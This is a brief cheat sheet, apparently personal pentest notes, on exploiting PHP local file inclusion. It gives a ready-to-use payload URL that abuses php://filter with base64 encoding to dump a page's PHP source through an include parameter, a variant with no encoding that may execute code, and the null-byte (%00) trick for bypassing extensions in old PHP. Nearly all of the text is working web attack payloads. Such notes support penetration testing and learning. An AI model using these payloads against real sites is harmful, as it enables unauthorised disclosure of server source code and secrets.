# php LFI

## include PHP filter URL
`php://filter` case insensitive

### base 64 encode
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=
```

### no encoding
also works with no convert encoding part - may still evaluate php code if used in `include`
```
php://filter/resource=
```

## filename extension nullbyte tecnhique - below php 5.3
%00
